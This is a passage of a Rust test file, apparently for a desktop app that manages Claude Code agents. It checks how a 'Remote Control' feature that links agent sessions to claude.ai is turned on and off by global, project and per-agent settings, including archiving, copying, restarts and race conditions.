    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    h.core.agent(&id).unwrap().lock().meta.remote_session = None;
    let asked = h.remote_requests(&r).len();
    h.core.set_remote_control(&id, false).await.unwrap();
    let tail = h.remote_requests(&r).split_off(asked);
    assert_eq!(tail.len(), 1, "{tail:?}");
    assert_eq!(tail[0]["enabled"], false);
    assert!(h.fake_log(&r, "archived").is_empty());
}

#[tokio::test]
async fn a_remote_session_no_live_process_could_close_is_kept_and_closed_by_the_next_process() {
    let h = harness("remote-off-no-process");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    let m = h.agent(&id);
    let session = m.remote_session.clone().unwrap();
    // Its process is gone when Remote Control ends: nothing can close the session now.
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    let asked = h.remote_requests(&r).len();
    h.core.set_remote_control(&id, false).await.unwrap();
    let after = h.agent(&id);
    assert!(!after.remote_control);
    // Its address is gone, the session it names is not: it is still there on claude.ai.
    assert_eq!(after.remote_session.as_deref(), Some(session.as_str()));
    assert_eq!(after.remote_url, None);
    assert_eq!(h.remote_requests(&r).len(), asked);
    assert!(h.fake_log(&r, "archived").is_empty());

    // The agent's next process closes it, and forgets it.
    h.core.ensure_process(&id).await.unwrap();
    h.assert_remote_closed(&r, asked, &session, &format!("demo · {}", m.name));
    assert_eq!(h.agent(&id).remote_session, None);
    assert!(!h.core.agent(&id).unwrap().lock().remote_linked);
}

#[tokio::test]
async fn a_remote_session_kept_is_reattached_by_the_next_process_when_remote_control_is_back() {
    let h = harness("remote-off-no-process-back");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    let session = h.agent(&id).remote_session.unwrap();
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    h.core.set_remote_control(&id, false).await.unwrap();
    // Turned on again before any process: it takes the session that stayed, closes nothing.
    h.core.set_remote_control(&id, true).await.unwrap();
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["enabled"], true);
    assert_eq!(req["reattach_session_id"], session.as_str());
    assert!(h.fake_log(&r, "archived").is_empty());
    assert_eq!(
        h.agent(&id).remote_session.as_deref(),
        Some(session.as_str())
    );
}

#[tokio::test]
async fn turning_remote_control_off_and_on_again_at_once_does_not_mix_the_two_sequences() {
    let h = harness("remote-off-on-at-once");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // A session opened is answered late: closing it takes a while.
    h.fake_slow(&r, "remote", 700);
    h.core.set_remote_control(&id, true).await.unwrap();
    let session = h.agent(&id).remote_session.unwrap();
    let asked = h.remote_requests(&r).len();

    let (core, agent) = (h.core.clone(), id.clone());
    let off = tokio::spawn(async move { core.set_remote_control(&agent, false).await });
    h.wait("the first request of the closing", |h| {
        h.remote_requests(&r).len() > asked
    })
    .await;
    // Back on while it closes: its link waits for the closing to be over.
    let (core, agent) = (h.core.clone(), id.clone());
    let on = tokio::spawn(async move { core.set_remote_control(&agent, true).await });
    off.await.unwrap().unwrap();
    on.await.unwrap().unwrap();

    let tail = h.remote_requests(&r).split_off(asked);
    let enabled: Vec<_> = tail.iter().map(|q| q["enabled"].clone()).collect();
    assert_eq!(
        enabled,
        [json!(false), json!(true), json!(false), json!(true)],
        "{tail:?}"
    );
    // The closing: reattached without keeping it, then off. Then a session of its own.
    assert_eq!(tail[1]["reattach_session_id"], session.as_str());
    assert_eq!(tail[1]["keep_session_on_exit"], false);
    assert!(tail[3].get("reattach_session_id").is_none(), "{tail:?}");
    assert_eq!(tail[3]["keep_session_on_exit"], true);
    assert_eq!(h.fake_log(&r, "archived"), [json!({ "bridge": session })]);
    let a = h.core.agent(&id).unwrap();
    let rt = a.lock();
    assert!(rt.meta.remote_control && rt.remote_linked);
    assert!(rt.meta.remote_session.is_some() && rt.meta.remote_url.is_some());
}

#[tokio::test]
async fn remote_agents_are_started_with_the_app() {
    let h = harness("remote-startup");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Creating an agent warms its process up: let it start, then stop it, so that only
    // start_remote_agents can start (and link) the next one.
    h.core.ensure_process(&id).await.unwrap();
    // The warm-up task only runs when the test yields (single-threaded runtime): let it finish.
    tokio::time::sleep(Duration::from_millis(300)).await;
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        rt.meta.remote_control = true;
        rt.meta.remote_source = Some(RemoteSource::Hand);
    }
    assert!(!h.alive(&id));
    h.core.start_remote_agents();
    h.wait("remote agent started", |h| {
        h.agent(&id).remote_url.is_some()
    })
    .await;
}

// ---------- Remote control for all the agents, or for a project's ----------

impl Harness {
    /// « Remote control pour tous les agents », saved as the settings window does.
    pub(crate) fn remote_all(&self, on: bool) {
        let mut s = self.core.settings.read().clone();
        s.remote_control_all = on;
        self.core.save_settings(s).unwrap();
    }

    /// « Remote control pour les agents de ce projet », saved as the project's window does.
    fn remote_project(&self, id: &str, on: bool) {
        let mut p = self.core.project(id).unwrap();
        p.remote_control = on;
        self.core.update_project(p).unwrap();
    }

    /// A second project, in a folder of its own.
    pub(crate) async fn second_project(&self) -> Project {
        let dir = self.dir.join("other");
        std::fs::create_dir_all(&dir).unwrap();
        self.core
            .create_project(
                &dir.to_string_lossy(),
                "other",
                "oklch(0.7 0.1 200)",
                false,
                None,
                false,
            )
            .await
            .unwrap()
    }

    /// The settings applied to every agent again, and waited for: what a setting did already is
    /// left as it is, and what it should not have done shows.
    pub(crate) async fn settle_remote(&self) {
        for task in self.core.apply_remote_to(None) {
            task.await.unwrap();
        }
    }

    /// Waits until the agent's remote control is in force from `source` with its session linked,
    /// or, with none, is out.
    async fn wait_remote(&self, id: &str, source: Option<RemoteSource>) {
        self.wait("the remote control applied", |h| {
            let a = h.core.agent(id).unwrap();
            let rt = a.lock();
            rt.meta.remote_control == source.is_some()
                && rt.meta.remote_source == source
                && rt.remote_linked == source.is_some()
        })
        .await
    }

    /// Whether the last Remote Control request the fake CLI got in the agent's folder `enabled` it.
    fn last_remote_request(&self, id: &str) -> Option<bool> {
        let cwd = self.agent(id).cwd;
        self.remote_requests(Path::new(&cwd))
            .last()
            .map(|r| r["enabled"].as_bool().unwrap())
    }

    fn remote_requests_of(&self, id: &str) -> Vec<Value> {
        let cwd = self.agent(id).cwd;
        self.remote_requests(Path::new(&cwd))
    }
}

#[test]
fn remote_control_comes_from_the_agents_choice_then_the_global_setting_then_the_projects() {
    use crate::core::remote_wanted;
    use RemoteSource::{Global, Hand, Project};
    let meta = |control: bool, source: Option<RemoteSource>, off: bool, archived: bool| AgentMeta {
        remote_control: control,
        remote_source: source,
        remote_off: off,
        archived,
        ..Default::default()
    };
    let plain = meta(false, None, false, false);
    assert_eq!(remote_wanted(&plain, false, false), None);
    assert_eq!(remote_wanted(&plain, false, true), Some(Project));
    assert_eq!(remote_wanted(&plain, true, false), Some(Global));
    // The global setting wins when both are on.
    assert_eq!(remote_wanted(&plain, true, true), Some(Global));
    // Turned on by hand: its own, whatever the settings say.
    let by_hand = meta(true, Some(Hand), false, false);
    assert_eq!(remote_wanted(&by_hand, false, false), Some(Hand));
    assert_eq!(remote_wanted(&by_hand, true, true), Some(Hand));
    // In force from a setting: it follows the settings.
    let from_global = meta(true, Some(Global), false, false);
    assert_eq!(remote_wanted(&from_global, true, false), Some(Global));
    assert_eq!(remote_wanted(&from_global, false, true), Some(Project));
    assert_eq!(remote_wanted(&from_global, false, false), None);
    let from_project = meta(true, Some(Project), false, false);
    assert_eq!(remote_wanted(&from_project, true, false), Some(Global));
    assert_eq!(remote_wanted(&from_project, false, false), None);
    // Set apart by hand: none, whatever the settings say.
    let apart = meta(false, None, true, false);
    assert_eq!(remote_wanted(&apart, true, true), None);
    // A choice made by hand, after it was set apart, comes first.
    let back_on = meta(true, Some(Hand), true, false);
    assert_eq!(remote_wanted(&back_on, false, false), Some(Hand));
    // Archived: none, even by hand.
    assert_eq!(
        remote_wanted(&meta(true, Some(Hand), false, true), true, true),
        None
    );
    assert_eq!(
        remote_wanted(&meta(false, None, false, true), true, true),
        None
    );
}

#[test]
fn the_remote_control_settings_have_the_names_the_window_reads() {
    let meta = AgentMeta {
        remote_control: true,
        remote_source: Some(RemoteSource::Project),
        remote_off: true,
        ..Default::default()
    };
    let v = serde_json::to_value(&meta).unwrap();
    assert_eq!(v["remoteControl"], true);
    assert_eq!(v["remoteSource"], "project");
    assert_eq!(v["remoteOff"], true);
    assert_eq!(json!(RemoteSource::Hand), "hand");
    assert_eq!(json!(RemoteSource::Global), "global");
    // Saved before there were such settings: off.
    let s: Settings = serde_json::from_value(json!({})).unwrap();
    assert!(!s.remote_control_all);
    assert!(!Settings::default().remote_control_all);
    assert_eq!(json!(Settings::default())["remoteControlAll"], false);
    let p: Project =
        serde_json::from_value(json!({ "id": "p", "name": "p", "path": "/p", "color": "c" }))
            .unwrap();
    assert!(!p.remote_control);
    let a: AgentMeta = serde_json::from_value(json!({ "id": "a" })).unwrap();
    assert_eq!((a.remote_source, a.remote_off), (None, false));
}

#[tokio::test]
async fn the_global_setting_gives_remote_control_to_the_agents_there_are_and_takes_it_back() {
    let h = harness("remote-all");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let archived = h.core.create_agent(&p.id, None).await.unwrap().meta;
    h.core.archive_agent(&archived.id, true).await.unwrap();

    h.remote_all(true);
    h.wait_remote(&a.id, Some(RemoteSource::Global)).await;
    h.wait_remote(&b.id, Some(RemoteSource::Global)).await;
    h.settle_remote().await;
    let req = h.remote_requests_of(&a.id).pop().unwrap();
    assert_eq!(req["enabled"], true);
    assert_eq!(req["name"], format!("demo · {}", a.name));
    assert!(h.agent(&a.id).remote_url.is_some());
    // An archived agent is not reachable from claude.ai.
    let c = h.agent(&archived.id);
    assert!(!c.remote_control && c.remote_source.is_none());
    assert!(h.remote_requests_of(&archived.id).is_empty());

    h.remote_all(false);
    h.wait_remote(&a.id, None).await;
    h.wait_remote(&b.id, None).await;
    // Closed for good (three requests), and only then forgotten.
    h.wait("the remote sessions closed", |h| {
        [&a.id, &b.id].iter().all(|id| {
            h.last_remote_request(id) == Some(false) && h.agent(id).remote_session.is_none()
        })
    })
    .await;
    let m = h.agent(&a.id);
    assert_eq!((m.remote_session, m.remote_url), (None, None));
    // Taken back by the setting, not set apart by hand: it comes back with the setting.
    assert!(!m.remote_off);
    h.remote_all(true);
    h.wait_remote(&a.id, Some(RemoteSource::Global)).await;
}

#[tokio::test]
async fn a_projects_setting_reaches_its_agents_only_and_the_global_one_comes_first() {
    let h = harness("remote-project");
    let (p, _) = h.project(false).await;
    let other = h.second_project().await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let b = h.core.create_agent(&other.id, None).await.unwrap().meta.id;

    h.remote_project(&p.id, true);
    h.wait_remote(&a, Some(RemoteSource::Project)).await;
    h.settle_remote().await;
    assert!(!h.agent(&b).remote_control);
    assert!(h.remote_requests_of(&b).is_empty());

    h.remote_all(true);
    h.wait_remote(&a, Some(RemoteSource::Global)).await;
    h.wait_remote(&b, Some(RemoteSource::Global)).await;
    // Global off: the project's setting still holds its agent, the other one loses it.
    h.remote_all(false);
    h.wait_remote(&a, Some(RemoteSource::Project)).await;
    h.wait_remote(&b, None).await;
    h.wait("the other session ended", |h| {
        h.last_remote_request(&b) == Some(false)
    })
    .await;
    // The agent the project holds was never unlinked, nor linked again.
    assert_eq!(h.remote_requests_of(&a).len(), 1);

    h.remote_project(&p.id, false);
    h.wait_remote(&a, None).await;
    h.wait("its session ended", |h| {
        h.last_remote_request(&a) == Some(false)
    })
    .await;
}

#[tokio::test]
async fn a_setting_turned_off_leaves_the_agents_turned_on_by_hand_alone() {
    let h = harness("remote-by-hand");
    let (p, _) = h.project(true).await;
    let by_hand = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let other = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&by_hand, true).await.unwrap();
    assert_eq!(h.agent(&by_hand).remote_source, Some(RemoteSource::Hand));

    h.remote_all(true);
    h.wait_remote(&other, Some(RemoteSource::Global)).await;
    h.settle_remote().await;
    assert_eq!(h.agent(&by_hand).remote_source, Some(RemoteSource::Hand));
    h.remote_all(false);
    h.wait_remote(&other, None).await;
    h.settle_remote().await;
    let m = h.agent(&by_hand);
    assert!(m.remote_control && m.remote_url.is_some());
    assert_eq!(m.remote_source, Some(RemoteSource::Hand));
    // Never unlinked, nor linked again.
    assert_eq!(h.remote_requests_of(&by_hand).len(), 1);
}

#[tokio::test]
async fn a_new_agent_gets_the_remote_control_a_setting_gives_a_tickets_agent_too() {
    let h = harness("remote-new");
    let (p, _) = h.project(false).await;
    let other = h.second_project().await;

    h.remote_all(true);
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait_remote(&a, Some(RemoteSource::Global)).await;
    assert!(h.agent(&a).remote_url.is_some());

    h.remote_all(false);
    h.remote_project(&other.id, true);
    let b = h.core.create_agent(&other.id, None).await.unwrap().meta.id;
    h.wait_remote(&b, Some(RemoteSource::Project)).await;
    let ticket_agent = h
        .core
        .create_agent_with(
            &other.id,
            AgentOptions {
                ticket_id: Some("T-1".into()),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta
        .id;
    h.wait_remote(&ticket_agent, Some(RemoteSource::Project))
        .await;
    // An agent of a project with no setting, while the global one is off, has none.
    let c = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.settle_remote().await;
    assert!(!h.agent(&c).remote_control);
}

#[tokio::test]
async fn a_copy_never_takes_the_remote_control_its_original_was_given_by_hand() {
    let h = harness("remote-copy");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta;
    h.settle_remote().await;
    let m = h.agent(&copy.id);
    assert!(!m.remote_control && !m.remote_off);
    assert_eq!(m.remote_source, None);
    assert!(h.agent(&id).remote_control);
}

#[tokio::test]
async fn a_copy_of_an_agent_set_apart_by_hand_is_set_apart_too() {
    let h = harness("remote-copy-apart");
    let (p, _) = h.project(false).await;
    let apart = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let plain = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&apart, true).await.unwrap();
    h.core.set_remote_control(&apart, false).await.unwrap();
    assert!(h.agent(&apart).remote_off);
    let copy = h.core.duplicate_agent(&apart).await.unwrap().meta;
    let other = h.core.duplicate_agent(&plain).await.unwrap().meta;
    assert!(h.agent(&copy.id).remote_off);
    assert!(!h.agent(&other.id).remote_off);
    // The settings give it none, as they give none to its original.
    h.remote_all(true);
    h.wait_remote(&other.id, Some(RemoteSource::Global)).await;
    h.wait_remote(&plain, Some(RemoteSource::Global)).await;
    h.settle_remote().await;
    let m = h.agent(&copy.id);
    assert!(!m.remote_control && m.remote_off);
}

#[tokio::test]
async fn an_agent_set_apart_by_hand_stays_without_remote_control_whatever_the_settings_do() {
    let h = harness("remote-apart");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.remote_all(true);
    h.wait_remote(&a, Some(RemoteSource::Global)).await;
    h.wait_remote(&b, Some(RemoteSource::Global)).await;

    // « Désactiver le remote control » while a setting covers it.
    h.core.set_remote_control(&a, false).await.unwrap();
    let m = h.agent(&a);
    assert!(m.remote_off && !m.remote_control);
    assert_eq!(
        (m.remote_source, m.remote_session, m.remote_url),
        (None, None, None)
    );
    assert_eq!(h.last_remote_request(&a), Some(false));
    h.settle_remote().await;
    assert!(h.agent(&a).remote_off && !h.agent(&a).remote_control);
    let asked = h.remote_requests_of(&a).len();

    // The setting turned off and on again does not bring it back.
    h.remote_all(false);
    h.wait_remote(&b, None).await;
    h.remote_all(true);
    h.wait_remote(&b, Some(RemoteSource::Global)).await;
    h.settle_remote().await;
    assert!(h.agent(&a).remote_off && !h.agent(&a).remote_control);
    assert_eq!(h.remote_requests_of(&a).len(), asked);

    // Nor does a restart of the app.
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    for task in reloaded.apply_remote_to(None) {
        task.await.unwrap();
    }
    let kept = reloaded.agent(&a).unwrap();
    assert!(kept.lock().meta.remote_off && !kept.lock().meta.remote_control);
    assert!(kept.lock().proc.is_none());
    reloaded.stop_for_good();

    // Turned on by hand, it is its own again: the settings leave it when they go.
    h.core.set_remote_control(&a, true).await.unwrap();
    let m = h.agent(&a);
    assert!(m.remote_control && !m.remote_off);
    assert_eq!(m.remote_source, Some(RemoteSource::Hand));
    assert!(m.remote_url.is_some());
    h.remote_all(false);
    h.wait_remote(&b, None).await;
    h.settle_remote().await;
    assert!(h.agent(&a).remote_control);
}

#[tokio::test]
async fn turning_remote_control_off_by_hand_always_sets_the_agent_apart() {
    let h = harness("remote-always-apart");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    h.core.set_remote_control(&id, false).await.unwrap();
    // No setting covered it, and it is set apart all the same.
    let m = h.agent(&id);
    assert!(!m.remote_control && m.remote_off);
    assert_eq!(m.remote_source, None);
    let asked = h.remote_requests_of(&id).len();
    // A setting turned on afterwards does not bring it back: the global one, nor a project's.
    h.remote_all(true);
    h.settle_remote().await;
    h.remote_all(false);
    h.remote_project(&p.id, true);
    h.settle_remote().await;
    let m = h.agent(&id);
    assert!(!m.remote_control && m.remote_off);
    assert_eq!(h.remote_requests_of(&id).len(), asked);
    // Turned on by hand, it is its own again, and no longer apart.
    h.core.set_remote_control(&id, true).await.unwrap();
    let m = h.agent(&id);
    assert!(m.remote_control && !m.remote_off);
    assert_eq!(m.remote_source, Some(RemoteSource::Hand));
    // Off again, a setting covering it now or later changes nothing.
    h.core.set_remote_control(&id, false).await.unwrap();
    assert!(h.agent(&id).remote_off);
}

#[tokio::test]
async fn archiving_an_agent_ends_its_remote_session_without_setting_it_apart_and_restoring_gives_it_back(
) {
    let h = harness("remote-archive");
    let (p, _) = h.project(true).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.remote_all(true);
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
    let before = h.agent(&id);
    let session = before.remote_session.clone().unwrap();
    let cwd = PathBuf::from(&before.cwd);
    let asked = h.remote_requests(&cwd).len();

    h.core.archive_agent(&id, true).await.unwrap();
    let m = h.agent(&id);
    assert!(m.archived && !m.remote_control && !m.remote_off);
    assert_eq!(
        (m.remote_source, m.remote_session, m.remote_url),
        (None, None, None)
    );
    assert_eq!(h.last_remote_request(&id), Some(false));
    // Its session on claude.ai is closed for good, not left behind.
    h.assert_remote_closed(&cwd, asked, &session, &format!("demo · {}", m.name));
    h.settle_remote().await;
    assert!(!h.agent(&id).remote_control);

    h.core.archive_agent(&id, false).await.unwrap();
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
}

#[tokio::test]
async fn deleting_an_agent_ends_its_remote_session() {
    let h = harness("remote-delete");
    let (p, _) = h.project(true).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.remote_all(true);
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
    let m = h.agent(&id);
    let session = m.remote_session.clone().unwrap();
    let cwd = PathBuf::from(&m.cwd);
    let asked = h.remote_requests(&cwd).len();
    h.core.delete_agent(&id, false).await.unwrap();
    assert_eq!(h.remote_requests(&cwd).pop().unwrap()["enabled"], false);
    h.assert_remote_closed(&cwd, asked, &session, &format!("demo · {}", m.name));
}

#[tokio::test]
async fn the_app_starting_applies_the_settings_to_every_agent() {
    let h = harness("remote-startup-rule");
    let (p, _) = h.project(true).await;
    let covered = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let dropped = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.remote_all(true);
    h.wait_remote(&covered, Some(RemoteSource::Global)).await;
    h.wait_remote(&dropped, Some(RemoteSource::Global)).await;
    // As the last run left them: one is in force and the setting is gone, another is covered and
    // not in force (the setting changed while the app was closed).
    h.core.settings.write().remote_control_all = false;
    h.core.start_remote_agents();
    h.wait_remote(&covered, None).await;
    h.wait_remote(&dropped, None).await;
    h.wait("their sessions ended", |h| {
        h.last_remote_request(&covered) == Some(false)
            && h.last_remote_request(&dropped) == Some(false)
    })
    .await;
    h.core.settings.write().remote_control_all = true;
    h.core.start_remote_agents();
    h.wait_remote(&covered, Some(RemoteSource::Global)).await;
    h.wait_remote(&dropped, Some(RemoteSource::Global)).await;
}

#[tokio::test]
async fn an_agent_in_the_claude_code_view_holds_the_remote_control_without_a_process_of_the_stream()
{
    let h = harness("remote-view");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_agent_view(&id, true).await.unwrap();
    h.remote_all(true);
    h.wait("the remote control in force", |h| {
        h.agent(&id).remote_source == Some(RemoteSource::Global)
    })
    .await;
    h.settle_remote().await;
    // Its interface has the session: no process here, no link.
    assert!(!h.alive(&id));
    assert!(h.remote_requests_of(&id).is_empty());
    // By hand: the choice is recorded, nothing more.
    h.remote_all(false);
    h.wait("the remote control out", |h| !h.agent(&id).remote_control)
        .await;
    h.core.set_remote_control(&id, true).await.unwrap();
    let m = h.agent(&id);
    assert!(m.remote_control && !m.remote_off);
    assert_eq!(m.remote_source, Some(RemoteSource::Hand));
    assert!(!h.alive(&id));
    assert!(h.remote_requests_of(&id).is_empty());
}

#[tokio::test]
async fn a_remote_control_that_cannot_start_stays_in_force_and_says_why() {
    let h = harness("remote-unavailable");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.ensure_process(&id).await.unwrap();
    // The warm-up task only runs when the test yields: let it finish before the process is stopped.
    tokio::time::sleep(Duration::from_millis(300)).await;
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    // Claude Code cannot be found: the process does not start.
    let fake = h.core.settings.read().claude_path.clone();
    h.core.settings.write().claude_path = h.dir.join("absent.cmd").to_string_lossy().to_string();
    h.remote_all(true);
    h.wait("the notice", |h| {
        h.items(&id).iter().any(|i| {
            i["kind"] == "notice"
                && i["level"] == "warn"
                && i["text"]
                    .as_str()
                    .unwrap()
                    .starts_with("Remote control indisponible : ")
        })
    })
    .await;
    let m = h.agent(&id);
    assert!(m.remote_control);
    assert_eq!(m.remote_source, Some(RemoteSource::Global));
    // Found again, the next start links it.
    h.core.settings.write().claude_path = fake;
    h.core.start_remote_agents();
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
}

#[tokio::test]
async fn data_from_before_the_settings_has_its_remote_control_by_hand() {
    let h = harness("remote-old-data");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        rt.meta.remote_control = true;
        rt.meta.remote_source = None;
    }
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let m = reloaded.agent(&id).unwrap().lock().meta.clone();
    assert!(m.remote_control);
    assert_eq!(m.remote_source, Some(RemoteSource::Hand));
    assert!(!m.remote_off);
}

#[tokio::test]
async fn the_session_is_renamed_in_claude_ai_with_its_project_while_remote_control_links_it() {
    let h = harness("remote-rename");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let titles = |h: &Harness| -> Vec<String> {
        h.fake_log(&r, "rename")
            .iter()
            .map(|t| t["title"].as_str().unwrap().to_string())
            .collect()
    };
    // Not linked: the session is called by the agent's name alone.
    h.core.ensure_process(&id).await.unwrap();
    h.core.rename_agent(&id, "ma-tache").await.unwrap();
    assert_eq!(titles(&h), ["ma-tache"]);

    // Linked: « projet · agent », as it is named in claude.ai.
    h.remote_all(true);
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
    h.core.rename_agent(&id, "autre-nom").await.unwrap();
    assert_eq!(titles(&h), ["ma-tache", "demo · autre-nom"]);

    // Named by Haiku after its first message: the same.
    let named = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait_remote(&named, Some(RemoteSource::Global)).await;
    h.turn(&named, "Create the hello file").await;
    h.wait("named", |h| h.agent(&named).named).await;
    let name = h.agent(&named).name;
    h.wait("its session renamed", |h| {
        titles(h).contains(&format!("demo · {name}"))
    })
    .await;
}

#[tokio::test]
async fn a_setting_turned_on_while_a_process_starts_links_it_once() {
    let h = harness("remote-start-race");
    let (p, r) = h.project(false).await;
    // Its start takes a while to answer: the process is there, not yet ready.
    h.fake_slow(&r, "initialize", 1500);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("its process", |h| h.alive(&id)).await;
    h.remote_all(true);
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
    h.wait("its start over", |h| {
        !h.core.agent(&id).unwrap().lock().commands.is_empty()
    })
    .await;
    h.settle_remote().await;
    // Its start links it, once it is ready; the setting does not link it a second time.
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(h.remote_requests_of(&id).len(), 1);
}

#[tokio::test]
async fn a_remote_control_cut_while_it_links_leaves_the_process_unlinked() {
    let h = harness("remote-cut-linking");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.ensure_process(&id).await.unwrap();
    // Its link takes a while to be answered.
    h.fake_slow(&r, "remote", 1500);
    h.remote_all(true);
    h.wait("the link asked", |h| h.remote_requests_of(&id).len() == 1)
        .await;
    h.remote_all(false);
    h.wait("the link closed again", |h| {
        h.last_remote_request(&id) == Some(false)
    })
    .await;
    // For good: its session is archived, not left on claude.ai.
    h.wait("its session archived", |h| {
        h.fake_log(&r, "archived").len() == 1
    })
    .await;
    let m = h.agent(&id);
    assert!(!m.remote_control && m.remote_source.is_none());
    assert_eq!((m.remote_session, m.remote_url), (None, None));
    assert!(!h.core.agent(&id).unwrap().lock().remote_linked);
}

#[tokio::test]
async fn a_remote_control_turned_off_by_hand_while_it_links_leaves_the_process_unlinked() {
    let h = harness("remote-cut-linking-by-hand");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.ensure_process(&id).await.unwrap();
    // Its link takes a while to be answered.
    h.fake_slow(&r, "remote", 1500);
    let (core, agent) = (h.core.clone(), id.clone());
    let turning_on = tokio::spawn(async move { core.set_remote_control(&agent, true).await });
    h.wait("the link asked", |h| h.remote_requests_of(&id).len() == 1)
        .await;
    h.core.set_remote_control(&id, false).await.unwrap();
    turning_on.await.unwrap().unwrap();
    h.wait("the link closed again", |h| {
        h.last_remote_request(&id) == Some(false)
    })
    .await;
    assert_eq!(h.fake_log(&r, "archived").len(), 1);
    let m = h.agent(&id);
    assert!(!m.remote_control && m.remote_source.is_none());
    assert_eq!((m.remote_session, m.remote_url), (None, None));
    assert!(!h.core.agent(&id).unwrap().lock().remote_linked);
}

#[tokio::test]
async fn the_agent_is_told_a_remote_control_could_not_link_only_while_it_holds_it() {
    let h = harness("remote-unavailable-notice");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let told = |h: &Harness| {
        h.items(&id)
            .iter()
            .filter(|i| {
                i["kind"] == "notice"
                    && i["text"]
                        .as_str()
                        .is_some_and(|t| t.starts_with("Remote control indisponible : boom"))
            })
            .count()
    };
    let boom = anyhow::anyhow!("boom");
    // The settings applied to the new agent are done: they leave what follows alone.
    h.settle_remote().await;
    // It was cut meanwhile: nothing to tell.
    h.core.remote_unavailable(&id, &boom, true);
    assert_eq!(told(&h), 0);
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        rt.meta.remote_control = true;
        rt.meta.remote_source = Some(RemoteSource::Hand);
    }
    h.core.remote_unavailable(&id, &boom, true);
    assert_eq!(told(&h), 1);
    // The stream failed, then the agent went to the Claude Code view: its interface holds the
    // session now. An interface's own failure is told.
    h.core.agent(&id).unwrap().lock().meta.terminal = true;
    h.core.remote_unavailable(&id, &boom, true);
    assert_eq!(told(&h), 1);
}

#[tokio::test]
async fn an_interfaces_own_failure_to_hold_remote_control_is_told() {
    let h = harness("remote-unavailable-interface");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.settle_remote().await;
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        rt.meta.remote_control = true;
        rt.meta.remote_source = Some(RemoteSource::Hand);
        rt.meta.terminal = true;
    }
    h.core
        .remote_unavailable(&id, &anyhow::anyhow!("boom"), false);
    assert_eq!(
        h.items(&id)
            .iter()
            .filter(|i| i["kind"] == "notice" && i["text"] == "Remote control indisponible : boom")
            .count(),
        1
    );
}

#[tokio::test]
async fn the_unavailable_notice_is_told_once_until_a_link_works_or_the_user_turns_it_on_by_hand() {
    let h = harness("remote-notice-once");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
